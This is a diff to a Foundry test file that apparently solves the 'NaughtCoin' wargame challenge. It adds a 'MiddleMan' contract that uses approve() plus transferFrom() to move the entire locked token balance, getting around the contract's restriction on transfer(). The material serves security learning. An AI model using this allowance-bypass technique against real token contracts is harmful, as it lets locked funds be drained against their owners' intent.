@@ -4,6 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "../src/NaughtCoin.sol";
 
+contract MiddleMan {
+    function attack(address prey, uint256 balance) public {
+        NaughtCoin naughtCoin = NaughtCoin(prey);
+        naughtCoin.transferFrom(msg.sender, address(this), balance);
+    }
+}
+
+// approve() + transferFrom() to bypass restriction on transfer()
 contract NaughtCoinTest is Test {
     NaughtCoin instance;
 
@@ -15,12 +23,13 @@ contract NaughtCoinTest is Test {
         uint256 balance = 1000000 * (10 ** 18);
         assertEq(instance.balanceOf(msg.sender), balance);
 
-        vm.prank(msg.sender);
-        instance.approve(address(this), balance);
+        MiddleMan middleMan = new MiddleMan();
 
-        instance.transferFrom(msg.sender, address(this), balance);
+        vm.startPrank(msg.sender);
+        instance.approve(address(middleMan), balance);
+        middleMan.attack(address(instance), balance);
 
         assertEq(instance.balanceOf(msg.sender), 0);
-        assertEq(instance.balanceOf(address(this)), balance);
+        assertEq(instance.balanceOf(address(middleMan)), balance);
     }
 }
